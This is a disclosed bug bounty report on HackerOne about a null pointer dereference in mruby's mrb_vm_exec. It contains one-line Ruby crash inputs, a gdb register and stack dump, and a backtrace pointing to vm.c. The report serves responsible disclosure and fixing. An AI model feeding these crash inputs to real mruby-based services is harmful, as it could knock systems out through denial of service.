# mrb_vm_exec - null ptr dereference

## Report Details
- **Report ID**: 210429
- **URL**: https://hackerone.com/reports/210429
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-03T17:12:14.337Z
- **Disclosed**: 2017-04-13T21:10:26.049Z

## Reporter
- **Username**: icanthack
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Linux Ubuntu Xenial x64
commit ffdf7be7235717fb1cd30e54c24c5383f705f110
Author: Yukihiro "Matz" Matsumoto <matz@ruby-lang.org>
Date:   Thu Mar 2 20:38:16 2017 +0900

Probably related with https://github.com/mruby/mruby/issues/3389

Old PoC
```
0.instance_eval { super() }
```

New PoC 
```
p.instance_eval { super() {1} [ ++1] }
```

output
```
 [----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x6c3e50 --> 0x0
RCX: 0x6c3e70 --> 0x300000001
RDX: 0x0
RSI: 0x1
RDI: 0x6b1010 --> 0x7fffffffde00 --> 0x0
RBP: 0x7fffffffdef0 --> 0x7fffffffdf40 --> 0x7fffffffdfa0 --> 0x7fffffffe130 --> 0x7fffffffe160 --> 0x7fffffffe220 (--> ...)
RSP: 0x7fffffffd880 --> 0x6b10e8 --> 0x6fb310 --> 0x7072e0 --> 0x1
RIP: 0x4225b0 (<mrb_vm_exec+5547>:	mov    eax,DWORD PTR [rax])
R8 : 0xd ('\r')
R9 : 0x6bc950 --> 0x1109
R10: 0x7ffff7ac8b88 --> 0x70d6f0 --> 0x0
R11: 0x7ffff7899390 --> 0xfffda380fffda0af
R12: 0x401990 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe300 --> 0x2
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x42259e <mrb_vm_exec+5529>:	lea    rdx,[rax*4+0x0]
   0x4225a6 <mrb_vm_exec+5537>:	mov    rax,QWORD PTR [rbp-0x470]
   0x4225ad <mrb_vm_exec+5544>:	add    rax,rdx
=> 0x4225b0 <mrb_vm_exec+5547>:	mov    eax,DWORD PTR [rax]
   0x4225b2 <mrb_vm_exec+5549>:	mov    DWORD PTR [rbp-0x620],eax
   0x4225b8 <mrb_vm_exec+5555>:	mov    rax,QWORD PTR [rbp-0x658]
   0x4225bf <mrb_vm_exec+5562>:	mov    rax,QWORD PTR [rax+0x20]
   0x4225c3 <mrb_vm_exec+5566>:	mov    rax,QWORD PTR [rax+0x8]
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd880 --> 0x6b10e8 --> 0x6fb310 --> 0x7072e0 --> 0x1
0008| 0x7fffffffd888 --> 0x720660 --> 0x800029008000a0
0016| 0x7fffffffd890 --> 0x6b3fb0 --> 0x10d
0024| 0x7fffffffd898 --> 0x6b1010 --> 0x7fffffffde00 --> 0x0
0032| 0x7fffffffd8a0 --> 0x7fff00ffd8d0
0040| 0x7fffffffd8a8 --> 0x6bd370 --> 0x6909 ('\ti')
0048| 0x7fffffffd8b0 --> 0xd00000002
0056| 0x7fffffffd8b8 --> 0x3008000a0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004225b0 in mrb_vm_exec (mrb=0x6b1010, proc=0x6b3fb0, pc=0x720660) at /home/vagrant/new/mruby/src/vm.c:1153
1153	      mrb_sym mid = syms[GETARG_B(i)];
```

bt
```
gdb-peda$ bt
#0  0x00000000004225b0 in mrb_vm_exec (mrb=0x6b1010, proc=0x6b3fb0, pc=0x720660) at /home/vagrant/new/mruby/src/vm.c:1153
#1  0x0000000000421003 in mrb_vm_run (mrb=0x6b1010, proc=0x6b4040, self=..., stack_keep=0x0) at /home/vagrant/new/mruby/src/vm.c:815
#2  0x0000000000429288 in mrb_top_run (mrb=0x6b1010, proc=0x6b4040, self=..., stack_keep=0x0) at /home/vagrant/new/mruby/src/vm.c:2568
#3  0x00000000004496ea in mrb_load_exec (mrb=0x6b1010, p=0x70d720, c=0x70c380) at /home/vagrant/new/mruby/mrbgems/mruby-compiler/core/parse.y:5759
#4  0x0000000000449780 in mrb_load_file_cxt (mrb=0x6b1010, f=0x70d370, c=0x70c380) at /home/vagrant/new/mruby/mrbgems/mruby-compiler/core/parse.y:5768
#5  0x00000000004022f0 in main (argc=0x2, argv=0x7fffffffe308) at /home/vagrant/new/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227
#6  0x00007ffff7725830 in __libc_start_main (main=0x401fd6 <main>, argc=0x2, argv=0x7fffffffe308, init=<optimized out>, fini=<optimized out>,
    rtld_fini=<optimized out>, stack_end=0x7fffffffe2f8) at ../csu/libc-start.c:291
#7  0x00000000004019b9 in _start ()
gdb-peda$
```

## Attachments
- Snip20170304_34.png
